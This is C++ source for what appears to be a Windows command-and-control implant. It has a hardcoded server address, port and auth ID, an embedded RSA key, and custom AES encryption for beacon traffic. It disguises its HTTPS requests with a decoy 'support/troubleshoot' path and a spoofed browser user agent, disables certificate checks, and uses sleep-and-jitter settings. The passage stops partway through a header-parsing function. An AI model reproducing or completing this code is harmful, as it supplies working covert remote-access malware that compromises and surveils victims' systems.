// x86_64-w64-mingw32-g++ -o HTTPS_RSA.exe HTTPS_RSA.cpp -lwininet -lcrypt32 -lbcrypt -lws2_32 -static -std=c++17 -lstdc++fs

#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <random>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <ctime>
#include <algorithm>
#include <cstring>
#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <shlwapi.h>
#include <filesystem>
#include <iomanip>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shlwapi.lib")

using namespace std;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

const string AUTH_ID = "a818f8e7-9bbf-42b0-af91-d4b142e8e543";
const string SERVER_HOST = "192.168.1.107";
const int SERVER_PORT = 1111;
const string DEFAULT_USER_AGENT = "Mozilla/5.0";
bool VERIFY_SSL = false;

const string RSA_PUBLIC_KEY_PEM =
    "-----BEGIN PUBLIC KEY-----\n"
    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArzyg7KTBT/MpciW4UKSk\n"
    "jWUz6y87YLNktzndjJvIpYTReAzK3ewzJihvz5l/uF4dCPZVhl9zvQW/9X501SmU\n"
    "nCPz4F+iiunt4mXVqv4rK3/QAM5UH3gUwTdFTnUCYMR94ZoR0NvKfIDnDV6sZxiR\n"
    "ETOwK5w+aQNF6H1/NcB1UuPKz1GpLtY9jcYYV6x+ihT1V/rGfFHdpNySHD6og+z1\n"
    "NSq0D3JiGAuSSfhhV+aPCZ8By8eh735r50WCiBFUw3Bd6oPjyeKDwUVBgGip+3UH\n"
    "0tlqFIZxHBPTCSZ6zJDW+40XWLlRSk5z1PLBJokiEQLiyxmA34rbmUzsRBD32L9y\n"
    "jwIDAQAB\n"
    "-----END PUBLIC KEY-----\n";


string base64_encode(const string& input) {
    if (input.empty()) return "";
    DWORD encodedSize = 0;
    CryptBinaryToStringA((const BYTE*)input.c_str(), (DWORD)input.length(),
                         CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encodedSize);
    if (encodedSize == 0) return "";
    vector<char> encoded(encodedSize);
    if (!CryptBinaryToStringA((const BYTE*)input.c_str(), (DWORD)input.length(),
                              CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encoded.data(), &encodedSize)) {
        return "";
    }
    return string(encoded.data());
}

string base64_decode(const string& input) {
    if (input.empty()) return "";
    string s = input;
    size_t missing = s.length() % 4;
    if (missing) s += string(4 - missing, '=');

    DWORD decodedSize = 0;
    CryptStringToBinaryA(s.c_str(), (DWORD)s.length(), CRYPT_STRING_BASE64,
                         NULL, &decodedSize, NULL, NULL);
    if (decodedSize == 0) return "";
    vector<BYTE> decoded(decodedSize);
    if (!CryptStringToBinaryA(s.c_str(), (DWORD)s.length(), CRYPT_STRING_BASE64,
                              decoded.data(), &decodedSize, NULL, NULL)) {
        return "";
    }
    return string((char*)decoded.data(), decodedSize);
}


string json_unescape(const string& s) {
    string result;
    result.reserve(s.size());
    for (size_t i = 0; i < s.size(); ++i) {
        if (s[i] == '\\' && i + 1 < s.size()) {
            char next = s[i + 1];
            if (next == 'n')  { result += '\n'; i++; continue; }
            if (next == 'r')  { result += '\r'; i++; continue; }
            if (next == 't')  { result += '\t'; i++; continue; }
            if (next == 'b')  { result += '\b'; i++; continue; }
            if (next == 'f')  { result += '\f'; i++; continue; }
            if (next == '\\') { result += '\\'; i++; continue; }
            if (next == '"')  { result += '"';  i++; continue; }
            if (next == '/')  { result += '/';  i++; continue; }
        }
        result += s[i];
    }
    return result;
}


namespace tiny_aes {
    static const uint8_t sbox[256] = {
        0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
        0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
        0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
        0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
        0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
        0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
        0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
        0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
        0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
        0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
        0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
        0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
        0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
        0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
        0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
        0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
    };
    static const uint8_t rsbox[256] = {
        0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,
        0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,
        0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,
        0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,
        0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,
        0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,
        0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,
        0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,
        0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,
        0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,
        0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,
        0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,
        0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,
        0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,
        0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,
        0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d
    };
    static const uint8_t Rcon[15] = { 0x8d,0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36,0x6c,0xd8,0xab,0x4d };

    struct AES_ctx {
        uint8_t RoundKey[240];
        uint8_t Iv[16];
        int Nk;
        int Nr;
    };

    static uint8_t xtime(uint8_t x) { return ((x << 1) ^ (((x >> 7) & 1) ? 0x1b : 0)); }

    static uint8_t mul(uint8_t x, uint8_t y) {
        uint8_t result = 0;
        while (y) { if (y & 0x01) result ^= x; x = xtime(x); y >>= 1; }
        return result;
    }

    static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key, int Nk) {
        int Nr = Nk + 6;
        int total_words = 4 * (Nr + 1);
        unsigned i, j, k;
        uint8_t tempa[4];
        for (i = 0; i < (unsigned)Nk; ++i) {
            RoundKey[i*4+0] = Key[i*4+0]; RoundKey[i*4+1] = Key[i*4+1];
            RoundKey[i*4+2] = Key[i*4+2]; RoundKey[i*4+3] = Key[i*4+3];
        }
        for (i = Nk; i < (unsigned)total_words; ++i) {
            k = (i - 1) * 4;
            tempa[0] = RoundKey[k+0]; tempa[1] = RoundKey[k+1];
            tempa[2] = RoundKey[k+2]; tempa[3] = RoundKey[k+3];
            if (i % Nk == 0) {
                const uint8_t u8tmp = tempa[0];
                tempa[0]=tempa[1]; tempa[1]=tempa[2]; tempa[2]=tempa[3]; tempa[3]=u8tmp;
                tempa[0]=sbox[tempa[0]]; tempa[1]=sbox[tempa[1]];
                tempa[2]=sbox[tempa[2]]; tempa[3]=sbox[tempa[3]];
                tempa[0] ^= Rcon[i/Nk];
            } else if (Nk > 6 && i % Nk == 4) {
                tempa[0]=sbox[tempa[0]]; tempa[1]=sbox[tempa[1]];
                tempa[2]=sbox[tempa[2]]; tempa[3]=sbox[tempa[3]];
            }
            j = i * 4;
            RoundKey[j+0] = RoundKey[(i-Nk)*4+0] ^ tempa[0];
            RoundKey[j+1] = RoundKey[(i-Nk)*4+1] ^ tempa[1];
            RoundKey[j+2] = RoundKey[(i-Nk)*4+2] ^ tempa[2];
            RoundKey[j+3] = RoundKey[(i-Nk)*4+3] ^ tempa[3];
        }
    }

    static void AES_init_ctx_iv(AES_ctx* ctx, const uint8_t* key, const uint8_t* iv, int key_len) {
        int Nk;
        if (key_len == 16) Nk = 4;
        else if (key_len == 24) Nk = 6;
        else Nk = 8;
        ctx->Nk = Nk;
        ctx->Nr = Nk + 6;
        KeyExpansion(ctx->RoundKey, key, Nk);
        memcpy(ctx->Iv, iv, 16);
    }

    static void SubBytes(uint8_t* state) { for (int i=0;i<16;++i) state[i]=sbox[state[i]]; }
    static void InvSubBytes(uint8_t* state) { for (int i=0;i<16;++i) state[i]=rsbox[state[i]]; }
    static void ShiftRows(uint8_t* state) {
        uint8_t temp;
        temp=state[1];state[1]=state[5];state[5]=state[9];state[9]=state[13];state[13]=temp;
        temp=state[2];state[2]=state[10];state[10]=temp;temp=state[6];state[6]=state[14];state[14]=temp;
        temp=state[15];state[15]=state[11];state[11]=state[7];state[7]=state[3];state[3]=temp;
    }
    static void InvShiftRows(uint8_t* state) {
        uint8_t temp;
        temp=state[13];state[13]=state[9];state[9]=state[5];state[5]=state[1];state[1]=temp;
        temp=state[14];state[14]=state[6];state[6]=temp;temp=state[10];state[10]=state[2];state[2]=temp;
        temp=state[3];state[3]=state[7];state[7]=state[11];state[11]=state[15];state[15]=temp;
    }
    static void MixColumns(uint8_t* state) {
        for (int i=0;i<4;++i) {
            uint8_t a=state[4*i+0],b=state[4*i+1],c=state[4*i+2],d=state[4*i+3];
            state[4*i+0]=mul(0x02,a)^mul(0x03,b)^mul(0x01,c)^mul(0x01,d);
            state[4*i+1]=mul(0x01,a)^mul(0x02,b)^mul(0x03,c)^mul(0x01,d);
            state[4*i+2]=mul(0x01,a)^mul(0x01,b)^mul(0x02,c)^mul(0x03,d);
            state[4*i+3]=mul(0x03,a)^mul(0x01,b)^mul(0x01,c)^mul(0x02,d);
        }
    }
    static void InvMixColumns(uint8_t* state) {
        for (int i=0;i<4;++i) {
            uint8_t a=state[4*i+0],b=state[4*i+1],c=state[4*i+2],d=state[4*i+3];
            state[4*i+0]=mul(0x0e,a)^mul(0x0b,b)^mul(0x0d,c)^mul(0x09,d);
            state[4*i+1]=mul(0x09,a)^mul(0x0e,b)^mul(0x0b,c)^mul(0x0d,d);
            state[4*i+2]=mul(0x0d,a)^mul(0x09,b)^mul(0x0e,c)^mul(0x0b,d);
            state[4*i+3]=mul(0x0b,a)^mul(0x0d,b)^mul(0x09,c)^mul(0x0e,d);
        }
    }
    static void AddRoundKey(uint8_t* state, const uint8_t* RoundKey, int round) {
        for (int i=0;i<16;++i) state[i] ^= RoundKey[(round*16)+i];
    }
    static void AES_encrypt(const uint8_t* in, uint8_t* out, const AES_ctx* ctx) {
        uint8_t state[16]; memcpy(state, in, 16);
        AddRoundKey(state, ctx->RoundKey, 0);
        for (int round=1; round<ctx->Nr; ++round) {
            SubBytes(state); ShiftRows(state); MixColumns(state); AddRoundKey(state, ctx->RoundKey, round);
        }
        SubBytes(state); ShiftRows(state); AddRoundKey(state, ctx->RoundKey, ctx->Nr);
        memcpy(out, state, 16);
    }
    static void AES_decrypt(const uint8_t* in, uint8_t* out, const AES_ctx* ctx) {
        uint8_t state[16]; memcpy(state, in, 16);
        AddRoundKey(state, ctx->RoundKey, ctx->Nr);
        for (int round=ctx->Nr-1; round>0; --round) {
            InvShiftRows(state); InvSubBytes(state); AddRoundKey(state, ctx->RoundKey, round); InvMixColumns(state);
        }
        InvShiftRows(state); InvSubBytes(state); AddRoundKey(state, ctx->RoundKey, 0);
        memcpy(out, state, 16);
    }
    static void AES_CBC_encrypt_buffer(AES_ctx* ctx, uint8_t* buf, size_t length) {
        uint8_t* iv = ctx->Iv;
        for (size_t i=0; i<length; i+=16) {
            for (int j=0;j<16;++j) buf[i+j] ^= iv[j];
            AES_encrypt(buf+i, buf+i, ctx);
            iv = buf+i;
        }
        memcpy(ctx->Iv, iv, 16);
    }
    static void AES_CBC_decrypt_buffer(AES_ctx* ctx, uint8_t* buf, size_t length) {
        uint8_t storeNextIv[16];
        for (size_t i=0; i<length; i+=16) {
            memcpy(storeNextIv, buf+i, 16);
            AES_decrypt(buf+i, buf+i, ctx);
            for (int j=0;j<16;++j) buf[i+j] ^= ctx->Iv[j];
            memcpy(ctx->Iv, storeNextIv, 16);
        }
    }
}


class AESCipher {
private:
    vector<unsigned char> key;
    int key_len;

    vector<unsigned char> pad(const vector<unsigned char>& data) {
        size_t padding_length = 16 - (data.size() % 16);
        vector<unsigned char> padded = data;
        padded.insert(padded.end(), padding_length, static_cast<unsigned char>(padding_length));
        return padded;
    }

    vector<unsigned char> unpad(const vector<unsigned char>& data) {
        if (data.empty()) return data;
        size_t padding_length = data.back();
        if (padding_length == 0 || padding_length > 16) return data;
        return vector<unsigned char>(data.begin(), data.end() - padding_length);
    }

public:
    AESCipher(const vector<unsigned char>& key_bytes) : key(key_bytes), key_len((int)key_bytes.size()) {
        if (key.size() != 16 && key.size() != 24 && key.size() != 32) {
            while (key.size() < 32) key.push_back('0');
            key.resize(32);
            key_len = 32;
        }
    }

    string encrypt(const string& raw) {
        vector<unsigned char> raw_bytes(raw.begin(), raw.end());
        raw_bytes = pad(raw_bytes);

        unsigned char iv[16];
        HCRYPTPROV hProv = 0;
        if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
            CryptGenRandom(hProv, 16, iv);
            CryptReleaseContext(hProv, 0);
        } else {
            for (int i = 0; i < 16; ++i) iv[i] = (unsigned char)(rand() % 256);
        }

        tiny_aes::AES_ctx ctx;
        tiny_aes::AES_init_ctx_iv(&ctx, key.data(), iv, key_len);

        vector<unsigned char> ciphertext = raw_bytes;
        tiny_aes::AES_CBC_encrypt_buffer(&ctx, ciphertext.data(), ciphertext.size());

        vector<unsigned char> result(iv, iv + 16);
        result.insert(result.end(), ciphertext.begin(), ciphertext.end());

        return base64_encode(string((char*)result.data(), result.size()));
    }

    string decrypt(const string& enc) {
        string decoded = base64_decode(enc);
        if (decoded.size() < 16) return "";

        vector<unsigned char> enc_bytes(decoded.begin(), decoded.end());
        vector<unsigned char> iv(enc_bytes.begin(), enc_bytes.begin() + 16);
        vector<unsigned char> ciphertext(enc_bytes.begin() + 16, enc_bytes.end());

        if (ciphertext.empty() || ciphertext.size() % 16 != 0) return "";

        tiny_aes::AES_ctx ctx;
        tiny_aes::AES_init_ctx_iv(&ctx, key.data(), iv.data(), key_len);

        vector<unsigned char> decrypted = ciphertext;
        tiny_aes::AES_CBC_decrypt_buffer(&ctx, decrypted.data(), decrypted.size());
        decrypted = unpad(decrypted);

        return string(decrypted.begin(), decrypted.end());
    }
};


class RSACipher {
private:
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_KEY_HANDLE hKey;
    bool valid;

public:
    RSACipher() : hAlg(nullptr), hKey(nullptr), valid(false) {
        string b64;
        {
            istringstream iss(RSA_PUBLIC_KEY_PEM);
            string line;
            bool in_body = false;
            while (getline(iss, line)) {
                if (line.find("-----BEGIN") != string::npos) { in_body = true; continue; }
                if (line.find("-----END") != string::npos) { in_body = false; continue; }
                if (in_body) {
                    while (!line.empty() && (line.back()=='\r'||line.back()=='\n')) line.pop_back();
                    b64 += line;
                }
            }
        }
        string der = base64_decode(b64);
        if (der.empty()) return;

        if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0))) return;

        vector<uint8_t> d(der.begin(), der.end());
        size_t idx = 0;
        if (d.size() < 4 || d[0] != 0x30) return;

        auto read_len = [&](size_t& i) -> size_t {
            size_t len = d[i++];
            if (len & 0x80) {
                int nbytes = len & 0x7F;
                len = 0;
                for (int k = 0; k < nbytes; ++k) len = (len << 8) | d[i++];
            }
            return len;
        };

        idx = 1;
        size_t outer_len = read_len(idx); (void)outer_len;
        if (d[idx] != 0x30) return; idx++;
        size_t alg_len = read_len(idx); idx += alg_len;
        if (d[idx] != 0x03) return; idx++;
        size_t bit_len = read_len(idx); (void)bit_len;
        idx++;
        if (d[idx] != 0x30) return; idx++;
        size_t rsa_seq_len = read_len(idx); (void)rsa_seq_len;

        if (d[idx] != 0x02) return; idx++;
        size_t n_len = read_len(idx);
        size_t n_off = idx;
        idx += n_len;

        if (d[idx] != 0x02) return; idx++;
        size_t e_len = read_len(idx);
        size_t e_off = idx;

        const uint8_t* mod_ptr = d.data() + n_off;
        size_t mod_len = n_len;
        while (mod_len > 0 && *mod_ptr == 0x00) { mod_ptr++; mod_len--; }

        const uint8_t* exp_ptr = d.data() + e_off;
        size_t exp_len = e_len;
        while (exp_len > 0 && *exp_ptr == 0x00) { exp_ptr++; exp_len--; }

        ULONG bitLen = (ULONG)(mod_len * 8);
        BCRYPT_RSAKEY_BLOB header{};
        header.Magic = BCRYPT_RSAPUBLIC_MAGIC;
        header.BitLength = bitLen;
        header.cbPublicExp = (ULONG)exp_len;
        header.cbModulus = (ULONG)mod_len;
        header.cbPrime1 = 0;
        header.cbPrime2 = 0;

        vector<BYTE> blob;
        blob.resize(sizeof(header) + exp_len + mod_len);
        memcpy(blob.data(), &header, sizeof(header));
        memcpy(blob.data() + sizeof(header), exp_ptr, exp_len);
        memcpy(blob.data() + sizeof(header) + exp_len, mod_ptr, mod_len);

        if (!NT_SUCCESS(BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPUBLIC_BLOB,
                                            &hKey, blob.data(), (ULONG)blob.size(), 0))) return;

        valid = true;
    }

    ~RSACipher() {
        if (hKey) BCryptDestroyKey(hKey);
        if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    }

    bool is_valid() const { return valid; }

    vector<uint8_t> encrypt(const vector<uint8_t>& plaintext) {
        vector<uint8_t> result;
        if (!valid) return result;

        ULONG cbResult = 0;
        BCRYPT_OAEP_PADDING_INFO oaepInfo{};
        oaepInfo.pszAlgId = BCRYPT_SHA1_ALGORITHM;
        oaepInfo.pbLabel = NULL;
        oaepInfo.cbLabel = 0;

        NTSTATUS st = BCryptEncrypt(hKey,
                                    (PUCHAR)plaintext.data(), (ULONG)plaintext.size(),
                                    &oaepInfo,
                                    NULL, 0,
                                    NULL, 0, &cbResult,
                                    BCRYPT_PAD_OAEP);
        if (!NT_SUCCESS(st)) return result;

        result.resize(cbResult);
        ULONG cbWritten = 0;
        st = BCryptEncrypt(hKey,
                           (PUCHAR)plaintext.data(), (ULONG)plaintext.size(),
                           &oaepInfo,
                           NULL, 0,
                           result.data(), cbResult, &cbWritten,
                           BCRYPT_PAD_OAEP);
        if (!NT_SUCCESS(st)) { result.clear(); return result; }
        result.resize(cbWritten);
        return result;
    }
};


class Json {
private:
    enum Type { JSON_NULL, JSON_OBJECT, JSON_ARRAY, JSON_STRING, JSON_BOOL, JSON_NUMBER };
    Type type;
    map<string, Json> object_value;
    vector<Json> array_value;
    string string_value;
    bool bool_value;
    double number_value;

public:
    Json() : type(JSON_NULL), bool_value(false), number_value(0) {}
    Json(nullptr_t) : type(JSON_NULL), bool_value(false), number_value(0) {}
    Json(const string& s) : type(JSON_STRING), string_value(s), bool_value(false), number_value(0) {}
    Json(const char* s) : type(JSON_STRING), string_value(s), bool_value(false), number_value(0) {}
    Json(bool b) : type(JSON_BOOL), bool_value(b), number_value(0) {}
    Json(int n) : type(JSON_NUMBER), number_value(n), bool_value(false) {}
    Json(double n) : type(JSON_NUMBER), number_value(n), bool_value(false) {}

    static Json object() { Json j; j.type = JSON_OBJECT; return j; }
    static Json array() { Json j; j.type = JSON_ARRAY; return j; }

    Json& operator[](const string& key) {
        if (type != JSON_OBJECT) { type = JSON_OBJECT; object_value.clear(); }
        return object_value[key];
    }

    void push_back(const Json& val) {
        if (type != JSON_ARRAY) { type = JSON_ARRAY; array_value.clear(); }
        array_value.push_back(val);
    }

    string dump(int indent = 0) const {
        if (type == JSON_NULL) return "null";
        if (type == JSON_BOOL) return bool_value ? "true" : "false";
        if (type == JSON_STRING) return "\"" + escape(string_value) + "\"";
        if (type == JSON_NUMBER) {
            char buf[64];
            if (number_value == (int)number_value) snprintf(buf, sizeof(buf), "%d", (int)number_value);
            else snprintf(buf, sizeof(buf), "%g", number_value);
            return string(buf);
        }
        if (type == JSON_ARRAY) {
            string result = "[";
            for (size_t i = 0; i < array_value.size(); i++) {
                if (i > 0) result += ",";
                if (indent >= 0) result += "\n" + string(indent + 2, ' ');
                result += array_value[i].dump(indent >= 0 ? indent + 2 : -1);
            }
            if (indent >= 0 && !array_value.empty()) result += "\n" + string(indent, ' ');
            result += "]";
            return result;
        }
        if (type == JSON_OBJECT) {
            string result = "{";
            bool first = true;
            for (const auto& pair : object_value) {
                if (!first) result += ",";
                first = false;
                if (indent >= 0) result += "\n" + string(indent + 2, ' ');
                result += "\"" + escape(pair.first) + "\":" + (indent >= 0 ? " " : "");
                result += pair.second.dump(indent >= 0 ? indent + 2 : -1);
            }
            if (indent >= 0 && !object_value.empty()) result += "\n" + string(indent, ' ');
            result += "}";
            return result;
        }
        return "null";
    }

private:
    static string escape(const string& s) {
        string result;
        for (char c : s) {
            if (c == '"') result += "\\\"";
            else if (c == '\\') result += "\\\\";
            else if (c == '\b') result += "\\b";
            else if (c == '\f') result += "\\f";
            else if (c == '\n') result += "\\n";
            else if (c == '\r') result += "\\r";
            else if (c == '\t') result += "\\t";
            else if (c < 0x20) { char buf[8]; snprintf(buf, sizeof(buf), "\\u%04x", c); result += buf; }
            else result += c;
        }
        return result;
    }
};


string session_id;
vector<string> uris = {"/support/troubleshoot"};
string current_user_agent = DEFAULT_USER_AGENT;
double sleep_time = 60.0;
int start_jitter = 0;
int end_jitter = 0;
string prepend_output = "";
string append_output = "";
map<string, string> get_client_headers;
map<string, string> post_client_headers;
AESCipher* aes = nullptr;
RSACipher* rsa = nullptr;

string json_escape(const string& s) {
    string out;
    out.reserve(s.size() + 16);
    for (unsigned char c : s) {
        switch (c) {
            case '\"': out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\b': out += "\\b";  break;
            case '\f': out += "\\f";  break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (c < 0x20) { char buf[8]; snprintf(buf, sizeof(buf), "\\u%04x", c); out += buf; }
                else out += c;
        }
    }
    return out;
}

string random_choice(const vector<string>& vec) {
    if (vec.empty()) return "";
    static random_device rd;
    static mt19937 gen(rd());
    uniform_int_distribution<> dis(0, (int)vec.size() - 1);
    return vec[dis(gen)];
}

string get_url() {
    return "https://" + SERVER_HOST + ":" + to_string(SERVER_PORT) + random_choice(uris);
}

map<string, string> get_request_headers(bool is_post) {
    map<string, string> headers;
    headers["User-Agent"] = current_user_agent;
    if (is_post) {
        headers["Content-Type"] = "application/json";
        for (const auto& h : post_client_headers)
            if (!h.second.empty()) headers[h.first] = h.second;
    } else {
        for (const auto& h : get_client_headers)
            if (!h.second.empty()) headers[h.first] = h.second;
    }
    return headers;
}

string http_request(const string& url, const string& method, const string& data, const map<string, string>& headers) {
    string host = SERVER_HOST;
    int port = SERVER_PORT;
    string path = "/support/troubleshoot";

    size_t https_pos = url.find("https://");
    if (https_pos != string::npos) {
        string temp = url.substr(https_pos + 8);
        size_t slash_pos = temp.find('/');
        if (slash_pos != string::npos) {
            string host_part = temp.substr(0, slash_pos);
            size_t colon_pos = host_part.find(':');
            if (colon_pos != string::npos) {
                host = host_part.substr(0, colon_pos);
                port = stoi(host_part.substr(colon_pos + 1));
            } else { host = host_part; port = 443; }
            path = temp.substr(slash_pos);
        }
    }

    HINTERNET hInternet = InternetOpenA(current_user_agent.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";

    HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hInternet); return ""; }

    DWORD flags = INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                  INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
                  INTERNET_FLAG_NO_CACHE_WRITE |
                  INTERNET_FLAG_SECURE;

    HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(), path.c_str(), NULL, NULL, NULL, flags, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return ""; }

    if (!VERIFY_SSL) {
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                        SECURITY_FLAG_IGNORE_WRONG_USAGE;
        InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

    string headers_str;
    for (const auto& h : headers)
        headers_str += h.first + ": " + h.second + "\r\n";
    if (method == "POST")
        headers_str += "Content-Length: " + to_string(data.length()) + "\r\n";
    headers_str += "\r\n";

    if (!HttpSendRequestA(hRequest, headers_str.c_str(), (DWORD)headers_str.length(),
                          (LPVOID)(method == "POST" ? data.c_str() : NULL),
                          method == "POST" ? (DWORD)data.length() : 0)) {
        InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet);
        return "";
    }

    string response;
    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        response += buffer;
    }

    InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet);
    return response;
}

string get_json_value(const string& json, const string& key) {
    string search = "\"" + key + "\":\"";
    size_t pos = json.find(search);
    if (pos == string::npos) {
        search = "\"" + key + "\":";
        pos = json.find(search);
        if (pos == string::npos) return "";
        pos += search.length();
        while (pos < json.length() && isspace((unsigned char)json[pos])) pos++;
        if (pos >= json.length()) return "";
        if (json[pos] == '"') {
            pos++;
            size_t end = json.find('"', pos);
            if (end == string::npos) return "";
            return json.substr(pos, end - pos);
        }
        size_t end = json.find_first_of(",}", pos);
        if (end == string::npos) end = json.length();
        return json.substr(pos, end - pos);
    }
    pos += search.length();
    size_t end = json.find('"', pos);
    if (end == string::npos) return "";
    return json.substr(pos, end - pos);
}

vector<string> get_json_array(const string& json, const string& key) {
    vector<string> result;
    string search = "\"" + key + "\":[";
    size_t pos = json.find(search);
    if (pos == string::npos) return result;
    pos += search.length();
    size_t end = json.find(']', pos);
    if (end == string::npos) return result;

    string arr = json.substr(pos, end - pos);
    size_t start = 0;
    while ((start = arr.find('\"', start)) != string::npos) {
        start++;
        size_t end_quote = arr.find('\"', start);
        if (end_quote == string::npos) break;
        result.push_back(arr.substr(start, end_quote - start));
        start = end_quote + 1;
    }
    return result;
}

map<string, string> parse_headers(const string& raw) {
    map<string, string> headers;
    if (raw.empty()) return headers;
    istringstream iss(raw);
    string line;
    while (getline(iss, line)) {
        size_t colon = line.find(':');
        if (colon == string::npos) continue;
        string k = line.substr(0, colon);
